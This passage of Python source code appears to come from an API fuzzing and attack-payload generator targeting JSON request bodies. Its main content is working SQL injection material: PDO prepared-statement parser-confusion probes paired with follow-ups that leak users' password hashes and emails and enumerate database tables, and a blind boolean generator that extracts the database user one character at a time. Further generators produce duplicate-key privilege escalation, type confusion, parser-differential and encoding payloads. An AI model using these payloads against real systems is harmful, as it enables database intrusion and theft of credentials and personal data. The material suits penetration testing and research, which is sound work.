        for ef in ("expires_at", "expiry", "valid_until", "token_expiry"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[ef] = {ef: 9999999999}      # huge timestamp
            p = self.mk(sub, f"Expiry window pushed to year 2286 via {ef}", ef, body,
                       impact="Token/coupon/session appears unexpired forever",
                       risk=Risk.HIGH, tags=["pdo_sql", "expiry"])
            if p: yield p

    # ============= S45 — Status / state bypass =============================
    def _s45_status_state_bypass(self, ctx: GeneratorContext) -> Iterator[Payload]:
        sub = "status_state"
        for sf in ("status", "state", "stage", "phase", "step"):
            for forced in ("approved", "active", "completed", "verified", "paid"):
                body = JsonEngine.deep_copy(ctx.orig)
                body[sf] = {sf: forced}
                p = self.mk(sub, f"State bypass {sf}={{{sf}:{forced!r}}}", sf, body,
                           impact=f"Force '{forced}' state on every matching record",
                           risk=Risk.HIGH, tags=["pdo_sql", "state"])
                if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.2  PdoPreparedStatementGenerator   (NEW in v7)
#
#      Implements the Searchlight Cyber / Adam Kues ("hashkitten") technique
#      from https://slcyber.io/research-center/a-novel-technique-for-sql-
#      injection-in-pdos-prepared-statements/  (July 2025).
#
#      Core idea
#      ─────────
#      PDO emulates prepared statements client-side by default
#      (PDO::ATTR_EMULATE_PREPARES=true). PDO ships its own re2c-generated
#      SQL scanner per driver. When user input is interpolated into the
#      query string itself (e.g. an unbindable identifier such as a column
#      name, or a hand-rolled fragment in mixed code), specific byte
#      sequences can confuse PDO's scanner into treating the input's `?`
#      or `:name` as a *bound parameter slot*, which then gets substituted
#      with the attacker's other (otherwise-safe) input → injection.
#
#      Primitives this module emits
#      ─────────────────────────────
#      • Null-byte-terminated identifier — `?\0` , `?#\0`, `\?#\0`
#      • Backslash-faked-escape in string literal (PHP 8.3 Postgres) — `\'?--`
#      • `:name?#\0` named-bound smuggle
#      • Backtick / double-quote / single-quote variants per dialect
#      • Comment-trailing variants: `#`, `--`, `/* */`
#      • Full attacker-side combined payload pairs (col + name)
#      • String-literal smuggle in any string field
#      • URL-encoded and raw byte forms for query-string contexts
#      • SQLite tokenization probe
#
#      Output shapes
#      ─────────────
#      Each payload is emitted in three forms where appropriate:
#         (a) raw bytes  (suitable for Burp Repeater)
#         (b) URL-encoded (suitable for query strings)
#         (c) JSON body  (string-literal smuggle into POST body fields)
# ──────────────────────────────────────────────────────────────────────────

@register
class PdoPreparedStatementGenerator(BaseGenerator):
    """Per-field injection of Searchlight Cyber PDO parser-confusion primitives.

    Every payload this generator emits is a *complete JSON body* with the
    user's original fields preserved, except ONE (or TWO, in pair-mode)
    field's value is replaced with a PDO smuggle / SQLi follow-up.

    Why this shape?  When a real PHP app interpolates a JSON body field
    into a hand-built SQL fragment AND uses prepare() elsewhere, PDO's
    emulated-prepare scanner mis-parses the embedded `?` / `:name` as a
    bound-parameter slot.  Submitting these JSON bodies probes exactly
    that mis-parse condition on every field of the body.

    Three families:
       A) probe_per_field   — each field's value gets a PDO probe primitive
       B) sqli_per_field    — each field's value gets a full SQLi payload
       C) pair_exploit      — (A, B) field pair: one carries the probe,
                              another carries the matching SQLi follow-up
                              (the canonical Searchlight Cyber attack shape).
    """
    NAME      = "pdo"
    CATEGORY  = "PDO_PARSER"
    ORDER     = 110
    MUTATION  = MutationType.PDO_PARSER
    RISK_BIAS = Risk.HIGH

    PARSER_TARGETS  = ["PHP PDO (mysql) emulated", "PHP PDO (pgsql) emulated"]
    BACKEND_TARGETS = ["MySQL/MariaDB", "PostgreSQL"]

    # PDO parser-confusion primitives.  Each value uses bytes that smuggle a
    # `?` or `:name` past PDO's scanner so PHP later treats it as a bound slot.
    # Format: (value, label, impact, risk, dialect)
    PROBES: List[Tuple[str, str, str, Risk, str]] = [
        ("?\x00",       "null_byte",       "Triggers parameter-count mismatch (vuln tell)",        Risk.HIGH,     "mysql"),
        ("?#\x00",      "hash_term",       "Smuggles `?` then # comment ends scan",                Risk.HIGH,     "mysql"),
        ("\\?#\x00",    "backslash_quote", "Backslash escapes PDO-auto-injected quote (FULL SQLi)", Risk.CRITICAL, "mysql"),
        (":x#\x00",     "named_smuggle",   "Smuggles `:x` as a named bound placeholder",            Risk.HIGH,     "mysql"),
        ("?--\x00",     "postgres_dash",   "Postgres dialect comment + null byte",                  Risk.HIGH,     "postgres"),
        ("\\'?#\x00",   "literal_break",   "Break out of manually-quoted string literal",           Risk.HIGH,     "mysql"),
        ("\\'?--",      "php83_postgres",  "PHP <=8.3 Postgres backslash-escape trick (no NUL)",    Risk.CRITICAL, "postgres"),
        ("\\\"?--",     "dquote_postgres", "Postgres double-quote variant",                         Risk.HIGH,     "postgres"),
    ]

    # SQLi follow-up payloads.  When paired with a probe field, this value
    # is what PDO substitutes into the bound slot.  MySQL variants use
    # backticks + `#` comments; PostgreSQL variants use UNION + `--`.
    # Format: (value, label, impact, risk, dialect)
    SQLI_FOLLOWUPS: List[Tuple[str, str, str, Risk, str]] = [
        ("x` FROM (SELECT password AS `'x` FROM users LIMIT 1)y;#",
         "leak_user_password",  "Leak first user's password hash",            Risk.CRITICAL, "mysql"),
        ("x` FROM (SELECT table_name AS `'x` FROM information_schema.tables)y;#",
         "enum_tables",         "Enumerate every table in the database",      Risk.CRITICAL, "mysql"),
        ("x` FROM (SELECT CURRENT_USER() AS `'x`)y;#",
         "leak_current_user",   "Leak the database CURRENT_USER()",           Risk.HIGH,     "mysql"),
        ("x` FROM (SELECT VERSION() AS `'x`)y;#",
         "leak_version",        "Leak DB VERSION()",                          Risk.HIGH,     "mysql"),
        ("x` FROM (SELECT schema_name AS `'x` FROM information_schema.schemata)y;#",
         "enum_schemata",       "Enumerate schemata",                         Risk.HIGH,     "mysql"),
        ("x` FROM (SELECT column_name AS `'x` FROM information_schema.columns WHERE table_name='users')y;#",
         "enum_users_columns",  "Enumerate columns of the users table",       Risk.HIGH,     "mysql"),
        ("x` FROM (SELECT email AS `'x` FROM users LIMIT 1)y;#",
         "leak_first_email",    "Leak first user's email",                    Risk.HIGH,     "mysql"),
        ("x` FROM (SELECT 1337 AS `'x`)y;#",
         "static_marker",       "Static-marker (1337) — confirms exploit",    Risk.MEDIUM,   "mysql"),
        ("UNION SELECT version(),current_user,1,1--",
         "pg_leak_version_user","PostgreSQL: leak version + current_user",    Risk.CRITICAL, "postgres"),
        ("UNION SELECT 1337,chr(33),1337,chr(33)--",
         "pg_static_marker",    "PostgreSQL: static-marker UNION",            Risk.HIGH,     "postgres"),
        ("UNION SELECT table_name,1,1,1 FROM information_schema.tables--",
         "pg_enum_tables",      "PostgreSQL: enumerate tables",               Risk.CRITICAL, "postgres"),
    ]

    # Only the two "attack-grade" probes drive pair-mode (otherwise the
    # cross-product explodes; the other probes are recon-only).
    _PAIR_PROBES: List[str] = ["backslash_quote", "php83_postgres"]

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if not ctx.orig:
            return

        # ────────────────────────────────────────────────────────────────
        # A) PER-FIELD PROBE INJECTION  (recon / parser-error oracle)
        # ────────────────────────────────────────────────────────────────
        for f in ctx.orig:
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for probe, label, impact, risk, dialect in self.PROBES:
                obj = JsonEngine.replace_field(ctx.orig, f, probe)
                p = self.mk("probe_per_field",
                    f"[{dialect}] PDO probe '{label}' injected into '{f}'",
                    f, obj,
                    expected=(f"If the backend interpolates `{f}` into a manual SQL "
                              f"fragment or identifier inside a PDO::prepare(), the "
                              f"scanner mis-parses the embedded `?`/`:x` as a bound slot"),
                    impact=impact,
                    parser_targets=self.PARSER_TARGETS,
                    backend_targets=self.BACKEND_TARGETS,
                    risk=risk, tags=["pdo", "probe", label, dialect],
                    field_type=ft)
                if p:
                    yield p

        # ────────────────────────────────────────────────────────────────
        # B) PER-FIELD FULL-SQLi INJECTION
        #    Puts the SQLi payload directly into a field's value — useful
        #    when that field IS the parameter that PDO substitutes into the
        #    confused slot supplied by some other input (URL param, etc).
        # ────────────────────────────────────────────────────────────────
        for f in ctx.orig:
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for sqli, label, impact, risk, dialect in self.SQLI_FOLLOWUPS:
                obj = JsonEngine.replace_field(ctx.orig, f, sqli)
                p = self.mk("sqli_per_field",
                    f"[{dialect}] PDO SQLi '{label}' injected into '{f}'",
                    f, obj,
                    expected="Payload lands at the bound-param substitution site once "
                             "the parser-confusion probe is supplied elsewhere",
                    impact=impact,
                    parser_targets=self.PARSER_TARGETS,
                    backend_targets=self.BACKEND_TARGETS,
                    risk=risk, tags=["pdo", "sqli", label, dialect],
                    field_type=ft)
                if p:
                    yield p

        # ────────────────────────────────────────────────────────────────
        # C) FIELD-PAIR EXPLOITATION  (canonical Searchlight Cyber attack)
        #    For every ORDERED pair (A, B) of distinct fields:
        #        A's value = probe primitive
        #        B's value = matching SQLi follow-up
        #    Dialect-matched: MySQL probe ↔ MySQL SQLi, PG probe ↔ PG SQLi.
        # ────────────────────────────────────────────────────────────────
        fields = [f for f in ctx.orig if ctx.is_targeted(f)]
        if len(fields) < 2:
            return

        attack_probes = [t for t in self.PROBES if t[1] in self._PAIR_PROBES]
        for col_f in fields:
            for name_f in fields:
                if name_f == col_f:
                    continue
                for probe, plabel, _pimpact, _prisk, pdialect in attack_probes:
                    for sqli, slabel, sdesc, _srisk, sdialect in self.SQLI_FOLLOWUPS:
                        if pdialect != sdialect:
                            continue
                        obj = JsonEngine.deep_copy(ctx.orig)
                        obj[col_f]  = probe
                        obj[name_f] = sqli
                        p = self.mk("pair_exploit",
                            f"[{pdialect}] PDO pair — '{col_f}' carries {plabel} probe, "
                            f"'{name_f}' carries {slabel} payload",
                            f"{col_f}+{name_f}", obj,
                            expected=("Mirrors Searchlight Cyber's col+name attack: "
                                      f"PDO mis-parses `{plabel}` in '{col_f}', then "
                                      f"the smuggled bound slot is substituted with "
                                      f"the SQLi from '{name_f}'"),
                            impact=sdesc,
                            parser_targets=self.PARSER_TARGETS,
                            backend_targets=self.BACKEND_TARGETS,
                            risk=Risk.CRITICAL,
                            tags=["pdo", "pair", plabel, slabel, pdialect])
                        if p:
                            yield p



# ──────────────────────────────────────────────────────────────────────────
# 7.2b  BooleanBlindSqliGenerator   (NEW — char-by-char USER() extraction)
#
#       Rotates four MySQL blind-boolean SQLi templates through every
#       printable ASCII char [A-Z][a-z][0-9] on every JSON parameter.
#       Each payload tests "does USER() start with character X?" — by
#       observing the response delta between a TRUE and FALSE answer,
#       an attacker extracts the database user one char at a time.
#
#       Templates:
#         ' AND INSTR(USER,'<CH>')=1 --
#         ' AND REGEXP_SUBSTR(USER, '^.{1}') = '<CH>' --
#         ' AND SUBSTR(USER,1,1)='<CH>' --
#         ' AND MID(USER,1,1)='<CH>' --
# ──────────────────────────────────────────────────────────────────────────

@register
class BooleanBlindSqliGenerator(BaseGenerator):
    """Per-field × per-character blind-boolean SQLi (USER() extraction)."""

    NAME      = "boolean_blind_sqli"
    CATEGORY  = "BOOLEAN_SQLI"
    ORDER     = 115                  # right after PDO_PARSER
    MUTATION  = MutationType.SQLI
    RISK_BIAS = Risk.HIGH

    PARSER_TARGETS  = ["MySQL/MariaDB"]
    BACKEND_TARGETS = ["MySQL/MariaDB", "PHP", "Node.js mysql/mysql2"]

    # The full character set the user asked for: A-Z, a-z, 0-9
    CHARSET: str = (
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789"
    )

    # User-supplied templates.  {CH} is replaced with the test character.
    # We carry both the literal USER (works in MySQL as a pseudo-fn) and
    # the parenthesised USER() variant (broader compatibility).
    TEMPLATES: List[Tuple[str, str]] = [
        ("instr",         "' AND INSTR(USER,'{CH}')=1 --"),
        ("regexp_substr", "' AND REGEXP_SUBSTR(USER, '^.{1}') = '{CH}' --"),
        ("substr",        "' AND SUBSTR(USER,1,1)='{CH}' --"),
        ("mid",           "' AND MID(USER,1,1)='{CH}' --"),
    ]

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if not ctx.orig:
            return
        for f in ctx.orig:
            if not ctx.is_targeted(f):
                continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            # Preserve original value so the WHERE clause still matches a row.
            # Skip the prefix for nested types (dict/list) and null.
            orig_val = ctx.orig[f]
            if isinstance(orig_val, (dict, list, type(None))):
                prefix = ""
            elif isinstance(orig_val, bool):
                prefix = "1" if orig_val else "0"
            else:
                prefix = str(orig_val)
            for tname, template in self.TEMPLATES:
                for ch in self.CHARSET:
                    payload_value = prefix + template.replace("{CH}", ch)
                    obj = JsonEngine.replace_field(ctx.orig, f, payload_value)
                    p = self.mk("char_test",
                        f"Blind-boolean SQLi ({tname}) — test char '{ch}' on field '{f}' "
                        f"(original value preserved)",
                        f, obj,
                        expected=("Original value preserved + SQLi appended — the WHERE "
                                  "clause still matches a real row, AND the extra predicate "
                                  "tests the first char of USER"),
                        impact="Char-by-char extraction of USER (or any SQL target)",
                        parser_targets=self.PARSER_TARGETS,
                        backend_targets=self.BACKEND_TARGETS,
                        risk=Risk.HIGH,
                        tags=["sqli", "blind", "boolean", tname, "char_" + ch],
                        field_type=ft)
                    if p:
                        yield p

# ──────────────────────────────────────────────────────────────────────────
# 7.3  TypeConfusionGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class TypeConfusionGenerator(BaseGenerator):
    NAME      = "type_confusion"
    CATEGORY  = "TYPE_CONFUSION"
    ORDER     = 200
    MUTATION  = MutationType.TYPE_CONFUSION
    RISK_BIAS = Risk.MEDIUM

    EDGES: List[Tuple[Any, str]] = [
        (None, "null"), (True, "true"), (False, "false"),
        (0, "int 0"), (1, "int 1"), (-1, "int -1"),
        (2**31, "int 2^31"), (2**31 - 1, "int 2^31-1"),
        (2**53, "JS-safe limit"), (2**53 + 1, "beyond JS-safe"),
        (2**63 - 1, "int64 max"), (2**63, "beyond int64"),
        (1.7976931348623157e308, "float max"),
        (5e-324, "float min"),
        (float("inf") if False else 1e400, "infinity-like"),  # we string-only below
        (-0, "negative-zero (int)"),  (-0.0, "negative-zero (float)"),
        (1e-10, "tiny float"), (1.0, "float 1.0"),
        ([], "empty array"), ({}, "empty object"),
        ("", "empty string"), ("0", "string '0'"), ("1", "string '1'"),
        ("true", "string 'true'"), ("false", "string 'false'"),
        ("null", "string 'null'"), ("NaN", "string 'NaN'"),
        ("Infinity", "string 'Infinity'"), ("-Infinity", "string '-Infinity'"),
        ("1e2", "scientific notation string"), ("0x10", "hex string"),
        ("0b1010", "binary string"), ("0o17", "octal string"),
    ]

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f, v in ctx.orig.items():
            if not ctx.is_targeted(f): continue
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for edge, lbl in self.EDGES:
                obj = JsonEngine.replace_field(ctx.orig, f, edge)
                risk = self._risk_for(ft)
                p = self.mk("scalar_edges",
                    f"Type confusion {f} ← {lbl}", f, obj,
                    expected="Backend may coerce, error, or silently accept",
                    impact="Auth/logic bypass, error oracle, type-tagged record mix",
                    risk=risk, tags=["type_confusion", lbl], field_type=ft)
                if p: yield p

        # JSON raw quirks — needs raw output (NaN / Infinity / negative-zero)
        for f in ctx.orig:
            for raw in ['NaN', 'Infinity', '-Infinity', '-0', '-0.0',
                        '1e1000', '0.1', '1E+1']:
                pre  = JsonEngine.dumps(ctx.orig)[:-1].rstrip("}")
                pairs = [(k, ctx.orig[k]) for k in ctx.orig if k != f]
                body = "{" + ",".join(
                    f'{json.dumps(k)}:{JsonEngine.dumps(v)}' for k, v in pairs
                )
                if pairs: body += ","
                body += f'{json.dumps(f)}:{raw}' + "}"
                p = self.mk("raw_number_literal",
                    f"Raw JSON literal {raw} for {f}", f,
                    payload_obj=None, raw_payload_str=body,
                    expected="JSON 'permissive' parsers (Python json with allow_nan, "
                             "JS5/JSON5) accept; strict ones reject",
                    impact="Parser differential (RFC8259 vs permissive)",
                    risk=Risk.MEDIUM, tags=["raw_literal", raw])
                if p: yield p

    @staticmethod
    def _risk_for(ft: FieldType) -> Risk:
        if ft in (FieldType.PASSWORD, FieldType.TOKEN, FieldType.ROLE,
                  FieldType.PRIVILEGE): return Risk.HIGH
        if ft in (FieldType.ID, FieldType.UUID, FieldType.EMAIL): return Risk.MEDIUM
        return Risk.LOW


# ──────────────────────────────────────────────────────────────────────────
# 7.4  DuplicateKeyGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class DuplicateKeyGenerator(BaseGenerator):
    NAME      = "duplicate_key"
    CATEGORY  = "DUPLICATE_KEY"
    ORDER     = 210
    MUTATION  = MutationType.DUPLICATE_KEY
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        # 1) Each field, duplicated (last-wins / first-wins probe)
        for f, v in ctx.orig.items():
            for second in [None, True, 0, 1, "", "admin", {"$ne": None}, [1]]:
                pairs: List[Tuple[str, Any]] = list(ctx.orig.items()) + [(f, second)]
                raw = JsonEngine.raw_object_with_duplicates(pairs)
                p = self.mk("dup_last_wins",
                    f"Dup key {f}: original + extra={second!r}", f,
                    payload_obj=None, raw_payload_str=raw,
                    expected="Parsers disagree: last-wins (json, Python, Go) "
                             "vs first-wins (some Java)",
                    impact="Validate one value, persist another (auth/role bypass)",
                    risk=Risk.HIGH, tags=["duplicate_key"])
                if p: yield p
        # 2) Triple-duplicate of privileged fields
        for priv, pv in PRIVILEGE_FIELDS.items():
            pairs = list(ctx.orig.items()) + [(priv, False), (priv, pv), (priv, True)]
            raw = JsonEngine.raw_object_with_duplicates(pairs)
            p = self.mk("dup_priv_triple",
                f"Triple-dup privilege key '{priv}' (false,real,true)", priv,
                payload_obj=None, raw_payload_str=raw,
                impact="Last-wins parsers promote attacker; middle-wins parsers "
                       "silently keep real value",
                risk=Risk.CRITICAL, tags=["duplicate_key", "privesc"])
            if p: yield p
        # 3) Mixed-type duplicates
        for f in ctx.orig:
            for a, b in [(1, "1"), ("1", 1), (True, 1), (None, "")]:
                pairs = [(k, v) for k, v in ctx.orig.items() if k != f]
                pairs += [(f, a), (f, b)]
                raw = JsonEngine.raw_object_with_duplicates(pairs)
                p = self.mk("dup_mixed_type",
                    f"Mixed-type dup on {f}: {a!r} then {b!r}", f,
                    payload_obj=None, raw_payload_str=raw,
                    risk=Risk.MEDIUM, tags=["duplicate_key", "type_mix"])
                if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.5  StructureMutationGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class StructureMutationGenerator(BaseGenerator):
    NAME      = "structure"
    CATEGORY  = "STRUCTURE"
    ORDER     = 220
    MUTATION  = MutationType.STRUCTURE
    RISK_BIAS = Risk.MEDIUM

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        # Whole-doc → array
        p = self.mk("body_array_wrap",
            "Wrap body inside top-level array",
            "*", [ctx.orig],
            expected="Strict frameworks reject; permissive ones unwrap",
            risk=Risk.MEDIUM, tags=["structure", "wrap"])
        if p: yield p
        p = self.mk("body_double_wrap",
            "Double-wrap [[body]]", "*", [[ctx.orig]],
            risk=Risk.MEDIUM, tags=["structure"])
        if p: yield p
        p = self.mk("body_in_object_data",
            "Body nested under 'data'", "*", {"data": ctx.orig},
            risk=Risk.LOW, tags=["structure"])
        if p: yield p
        p = self.mk("body_in_object_params",
            "Body nested under 'params'", "*", {"params": ctx.orig},
            risk=Risk.LOW, tags=["structure"])
        if p: yield p
        # Each field → array / object / null / empty
        for f, v in ctx.orig.items():
            for new_val, name in [
                ([v], "wrap-in-array"),
                ([v, v], "double-array"),
                ({f: v}, "wrap-in-object-same-key"),
                ({"value": v}, "wrap-in-{value:}"),
                ({}, "empty-object"),
                ([], "empty-array"),
                (None, "null"),
                ({f: {f: v}}, "double-nested"),
            ]:
                obj = JsonEngine.replace_field(ctx.orig, f, new_val)
                p = self.mk(f"field_{name}",
                    f"Field {f} → {name}", f, obj,
                    risk=Risk.LOW, tags=["structure", name])
                if p: yield p
        # Sparse arrays
        for depth in (3, 5, 10):
            obj = ctx.orig
            for _ in range(depth):
                obj = [obj]
            p = self.mk("deep_array_wrap",
                f"Body wrapped {depth}× in arrays", "*", obj,
                risk=Risk.LOW, tags=["structure", f"depth_{depth}"])
            if p: yield p
        # Nested structure for each field
        for f, v in ctx.orig.items():
            obj = v
            for d in (3, 5, 10, 20):
                obj = {f: obj}
                payload = JsonEngine.replace_field(ctx.orig, f, obj)
                p = self.mk(f"field_nest_d{d}",
                    f"{f} nested {d} levels deep", f, payload,
                    risk=Risk.LOW, tags=["structure", "nested"])
                if p: yield p
                if d > MAX_NESTING_DEPTH: break


# ──────────────────────────────────────────────────────────────────────────
# 7.6  ParserDifferentialGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class ParserDifferentialGenerator(BaseGenerator):
    NAME      = "parser_diff"
    CATEGORY  = "PARSER_DIFFERENTIAL"
    ORDER     = 230
    MUTATION  = MutationType.PARSER_DIFFERENTIAL
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        # Comments
        body_str = JsonEngine.dumps(ctx.orig)
        for c in [' /* fuzz */ ', ' // fuzz\n', ' --fuzz\n', ' # fuzz\n']:
            raw = body_str[:1] + c + body_str[1:]
            p = self.mk("comment_smuggling",
                f"Insert comment {c!r} after opening brace",
                "*", payload_obj=None, raw_payload_str=raw,
                expected="Lax parsers (JSON5, JSONC, Postgres' JSON) accept; "
                         "RFC8259 parsers reject",
                impact="Differential — frontend sees one value, backend another",
                risk=Risk.HIGH, tags=["parser_diff", "comment"])
            if p: yield p
        # Trailing comma
        if ctx.orig:
            raw = body_str[:-1] + "," + "}"
            p = self.mk("trailing_comma",
                "Trailing comma before closing brace",
                "*", payload_obj=None, raw_payload_str=raw,
                risk=Risk.MEDIUM, tags=["parser_diff", "trailing_comma"])
            if p: yield p
        # Unquoted key
        if ctx.orig:
            k0 = next(iter(ctx.orig))
            v0 = ctx.orig[k0]
            raw = "{" + k0 + ":" + JsonEngine.dumps(v0) + "}"
            p = self.mk("unquoted_key",
                f"Unquoted key '{k0}'", "*", payload_obj=None,
                raw_payload_str=raw, risk=Risk.MEDIUM,
                tags=["parser_diff", "unquoted_key"])
            if p: yield p
        # Single-quoted strings
        if ctx.orig:
            k0 = next(iter(ctx.orig))
            v0 = ctx.orig[k0]
            raw = "{'" + k0 + "':" + JsonEngine.dumps(v0) + "}"
            p = self.mk("single_quoted_key",
                f"Single-quoted key '{k0}'", "*", payload_obj=None,
                raw_payload_str=raw, risk=Risk.MEDIUM,
                tags=["parser_diff", "single_quote"])
            if p: yield p
        # BOM
        for bom, name in [('﻿', 'BOM-UTF8'),
                          ('​', 'zero-width-space')]:
            raw = bom + body_str
            p = self.mk("byte_order_mark",
                f"Prefix payload with {name}", "*",
                payload_obj=None, raw_payload_str=raw,
                risk=Risk.LOW, tags=["parser_diff", "bom"])
            if p: yield p
        # Bishop Fox parsing-permissiveness: leading whitespace bytes
        for ws in ['\x09', '\x0b', '\x0c', '\xa0', '　']:
            raw = ws + body_str
            p = self.mk("leading_whitespace",
                f"Prefix payload with whitespace U+{ord(ws):04X}",
                "*", payload_obj=None, raw_payload_str=raw,
                risk=Risk.LOW, tags=["parser_diff", "whitespace"])
            if p: yield p
        # Invalid escapes
        for f in ctx.orig:
            if not isinstance(ctx.orig[f], str): continue
            for esc in [r'\xZZ', r'\u00ZZ', r'\u{1F600}', r'\q', r'\0']:
                inner = ctx.orig[f] + esc
                raw_value = '"' + inner.replace('"', r'\"') + '"'
                pairs = [(k, ctx.orig[k]) for k in ctx.orig if k != f]
                parts = [f'{json.dumps(k)}:{JsonEngine.dumps(v)}' for k, v in pairs]
                parts.append(f'{json.dumps(f)}:{raw_value}')
                raw = "{" + ",".join(parts) + "}"
                p = self.mk("invalid_escape",
                    f"Invalid escape sequence {esc!r} in {f}", f,
                    payload_obj=None, raw_payload_str=raw,
                    risk=Risk.MEDIUM, tags=["parser_diff", "escape"])
                if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.7  EncodingGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class EncodingGenerator(BaseGenerator):
    NAME      = "encoding"
    CATEGORY  = "ENCODING"
    ORDER     = 240
    MUTATION  = MutationType.ENCODING
    RISK_BIAS = Risk.MEDIUM

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f, v in ctx.orig.items():
            if not isinstance(v, str): continue
            ft = ctx.field_types.get(f, FieldType.STRING)
            # zero-width chars
            for zw in ZERO_WIDTH:
                obj = JsonEngine.replace_field(ctx.orig, f, zw + v)
                p = self.mk("zero_width_prefix",
                    f"Zero-width char U+{ord(zw):04X} prefix on {f}",
                    f, obj, risk=Risk.MEDIUM, tags=["encoding", "zw"],
                    field_type=ft)
                if p: yield p
            # bidi controls
            for b in BIDI:
                obj = JsonEngine.replace_field(ctx.orig, f, v + b + v)
                p = self.mk("bidi_control",
                    f"Bidi control U+{ord(b):04X} embedded in {f}",
                    f, obj, risk=Risk.MEDIUM, tags=["encoding", "bidi"],
                    field_type=ft)
                if p: yield p
            # CRLF / null byte
            for inj, name in [('\r\n', 'CRLF'), ('\n', 'LF'), ('\x00', 'NULL')]:
                obj = JsonEngine.replace_field(ctx.orig, f, v + inj + v)
                p = self.mk("control_injection",
                    f"{name} injection in {f}", f, obj,
                    risk=Risk.HIGH, tags=["encoding", name.lower()],
                    field_type=ft)
                if p: yield p
            # homoglyphs (only on alphabetic fields)
            mapped = "".join(HOMOGLYPHS.get(c, c) for c in v)
            if mapped != v:
                obj = JsonEngine.replace_field(ctx.orig, f, mapped)
                p = self.mk("homoglyph",
                    f"Homoglyph substitution on {f}",
                    f, obj, risk=Risk.MEDIUM, tags=["encoding", "homoglyph"],
                    field_type=ft)
                if p: yield p
            # Unicode normalization (NFD/NFC/NFKD/NFKC)
            for form in ("NFC", "NFD", "NFKC", "NFKD"):
                try:
                    n = unicodedata.normalize(form, v)
                except Exception:
                    continue
                if n != v:
                    obj = JsonEngine.replace_field(ctx.orig, f, n)
                    p = self.mk("normalization",
                        f"Unicode {form} normalization of {f}",
                        f, obj, risk=Risk.MEDIUM,
                        tags=["encoding", form.lower()], field_type=ft)
                    if p: yield p
            # Turkish I dotted/dotless
            if any(c in v for c in "iI"):
                obj = JsonEngine.replace_field(ctx.orig, f, v.replace("i", "İ").replace("I", "ı"))
                p = self.mk("turkish_i",
                    f"Turkish I case-flip on {f}", f, obj,
                    risk=Risk.MEDIUM, tags=["encoding", "turkish_i"],
                    field_type=ft)
                if p: yield p
            # Case toggles
            for cv, lbl in [(v.upper(), "upper"), (v.lower(), "lower"),
                            (v.title(), "title")]:
                if cv == v: continue
                obj = JsonEngine.replace_field(ctx.orig, f, cv)
                p = self.mk("case_toggle",
                    f"Case-{lbl} {f}", f, obj,
                    risk=Risk.LOW, tags=["encoding", "case"], field_type=ft)
                if p: yield p
            # URL / double-URL encoded
            from urllib.parse import quote
            obj = JsonEngine.replace_field(ctx.orig, f, quote(v))
            p = self.mk("url_encoded",
                f"URL-encoded {f}", f, obj,
                risk=Risk.LOW, tags=["encoding", "url"], field_type=ft)
            if p: yield p
            obj = JsonEngine.replace_field(ctx.orig, f, quote(quote(v)))
            p = self.mk("double_url_encoded",
                f"Double URL-encoded {f}", f, obj,
                risk=Risk.LOW, tags=["encoding", "url2"], field_type=ft)
            if p: yield p
            # \uXXXX escapes for ASCII
            obj_str = JsonEngine.dumps(ctx.orig)
            esc_value = "".join(f"\\u{ord(c):04x}" for c in v)
            pairs = [(k, ctx.orig[k]) for k in ctx.orig if k != f]
            parts = [f'{json.dumps(k)}:{JsonEngine.dumps(v2)}' for k, v2 in pairs]
            parts.append(f'{json.dumps(f)}:"{esc_value}"')
            raw = "{" + ",".join(parts) + "}"
            p = self.mk("unicode_escape",
                f"All-\\uXXXX escape of {f}", f,
                payload_obj=None, raw_payload_str=raw,
                risk=Risk.LOW, tags=["encoding", "escape"], field_type=ft)
            if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.8  SerializationGenerator   (ORM / driver quirks)
# ──────────────────────────────────────────────────────────────────────────

@register
class SerializationGenerator(BaseGenerator):
    NAME      = "serialization"
    CATEGORY  = "SERIALIZATION"
    ORDER     = 250
    MUTATION  = MutationType.SERIALIZATION
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        yield from self._php_json_decode(ctx)
        yield from self._jackson(ctx)
        yield from self._fastjson(ctx)
        yield from self._gson(ctx)
        yield from self._newtonsoft(ctx)
        yield from self._python_orjson(ctx)
        yield from self._go(ctx)
        yield from self._prisma(ctx)
        yield from self._sequelize(ctx)
        yield from self._mongoose(ctx)
        yield from self._typeorm(ctx)

    def _php_json_decode(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, {"__class__": "stdClass"})
            p = self.mk("php_json_decode",
                f"PHP json_decode object-vs-array on {f}", f, obj,
                expected="json_decode($x,true) → assoc array; $false → stdClass",
                impact="Type confusion if isset()/array_key_exists used on wrong shape",
                parser_targets=["PHP json_decode"], risk=Risk.MEDIUM,
                tags=["serialization", "php"])
            if p: yield p

    def _jackson(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if not ctx.orig: return
        f = next(iter(ctx.orig))
        # Polymorphic type tag (Jackson default typing)
        obj = JsonEngine.replace_field(ctx.orig, f,
                {"@class": "java.util.HashMap", "value": ctx.orig[f]})
        p = self.mk("jackson_polymorphic",
            f"Jackson @class polymorphic tag on {f}", f, obj,
